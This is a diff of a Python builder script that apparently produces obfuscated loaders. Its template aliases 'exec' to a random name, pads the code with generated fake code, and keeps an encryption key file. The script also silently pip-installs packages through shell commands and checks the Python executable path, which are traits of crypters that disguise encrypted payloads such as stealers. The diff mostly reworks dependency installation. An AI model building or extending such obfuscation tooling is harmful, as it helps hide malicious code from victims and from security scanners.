@@ -5,10 +5,17 @@ import subprocess
 import random
 import os
 import string
-from cryptography.fernet import Fernet
 import logging
 import sys
 import time
+try:
+    import cryptography
+except:
+    subprocess.run(f'python -m pip install cryptography', shell=True, check=True)
+
+
+from cryptography.fernet import Fernet
+
 # Constants and configurations
 BUILD_PATH = "./build"
 TEMP_FILE_PATH = "./Build/temp.py"
@@ -17,30 +24,6 @@ ENCRYPTION_KEY_FILE = "encryption_key.txt"
 # Configure logging
 logging.basicConfig(level=logging.INFO)
 
-def install_missing_package(package_name):
-    """
-    Install missing Python package using subprocess.
-    """
-    try:
-        subprocess.run(f'python -m pip install {package_name}', shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        logging.error(f"Failed to install package {package_name}: {e}")
-        sys.exit(1)
-
-def import_or_install(package_name, import_name=None):
-    """
-    Import a package, or install it if not present.
-    """
-    if not import_name:
-        import_name = package_name
-
-    try:
-        return __import__("cryptography")
-    except ImportError:
-        install_missing_package(package_name)
-        return __import__("cryptography")
-
-Crypto = import_or_install('cryptography', 'cryptography')
 
 # Function Definitions
 def generate_random_string(length=19, chars=string.ascii_letters + string.digits):
@@ -141,20 +124,8 @@ except ImportError:
 import subprocess
 requirements = [
     ["requests", "requests"],
-    ["cryptography", "cryptography"]
+    ["Cryptodome.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
-for modl in requirements:
-    try: __import__(modl[0])
-    except:
-        subprocess.Popen(executable + " -m pip install modl[1]", shell=True)
-        time.sleep(3)
-
-    
-try:        
-    __import__("cryptography")
-except:
-    subprocess.Popen(executable + " -m pip install cryptography --quiet", shell=True)
-
 
 import requests
 
@@ -189,7 +160,7 @@ import time
 
 requirements = [
     ["requests", "requests"],
-    ["cryptography", "cryptography"]
+    ["Cryptodome.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto']
 ]
 for modl in requirements:
     try: __import__(modl[0])
@@ -216,9 +187,6 @@ except:
     subprocess.run("python -m pip install requests", shell=True)
 
 import requests
-from cryptography.fernet import Fernet
-from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-from cryptography.hazmat.backends import default_backend
 {all_fake_code}
 {e} = exec
 {all_fake_code}
